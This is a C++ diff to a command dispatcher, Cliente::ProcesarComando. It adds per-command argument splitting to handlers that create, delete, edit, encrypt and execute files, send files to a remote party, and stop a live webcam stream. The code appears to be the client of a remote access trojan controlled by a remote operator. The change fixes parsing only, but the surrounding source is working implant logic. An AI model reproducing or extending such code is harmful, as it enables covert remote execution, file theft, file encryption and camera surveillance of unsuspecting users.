@@ -248,21 +248,25 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
 
     //crear folder
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Crear_Folder) {
+        strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
         CrearFolder(strIn[1].c_str());
         return;
     }
 
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Crear_Archivo) {
+        strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
         CrearArchivo(strIn[1].c_str());
         return;
     }
 
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Borrar_Archivo) {
+        strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
         BorrarArchivo(strIn[1].c_str());
         return;
     }
 
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Descargar_Archivo) {
+        strIn = strSplit(std::string(pBuffer), CMD_DEL, 3);
         std::string param1 = strIn[1];
         std::string param2 = strIn[2];
         std::thread th(&EnviarArchivo, param1, param2);
@@ -271,6 +275,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
     }
 
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Ejecutar_Archivo){
+        strIn = strSplit(std::string(pBuffer), CMD_DEL, 3);
         bool isOK = Execute(strIn[1].c_str(), strIn[2] == "1" ? 1 : 0);
 
         if(isOK){
@@ -282,11 +287,13 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
     }
 
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Editar_Archivo){
+        strIn = strSplit(std::string(pBuffer), CMD_DEL, 3);
         EditarArchivo(strIn[1], strIn[2]);
         return;
     }
 
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Editar_Archivo_Guardar) {
+        strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
         int iHeader = strIn[0].size() + strIn[1].size() + 2;
         char* cBytes = pBuffer + iHeader;
         std::string strBuffer = std::string(cBytes);
@@ -296,6 +303,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
     }
 
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Crypt_Archivo) {
+        strIn = strSplit(std::string(pBuffer), CMD_DEL, 4);
         Crypt_Archivo(strIn[2], strIn[1][0], strIn[1][1], strIn[3]);
         return;
     }
@@ -461,6 +469,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
     }
 
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::CM_Live_Stop) {
+        strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
         u_int iDeviceIndex = atoi(strIn[1].c_str());
         this->mod_Cam->JoinLiveThread(iDeviceIndex);
     }
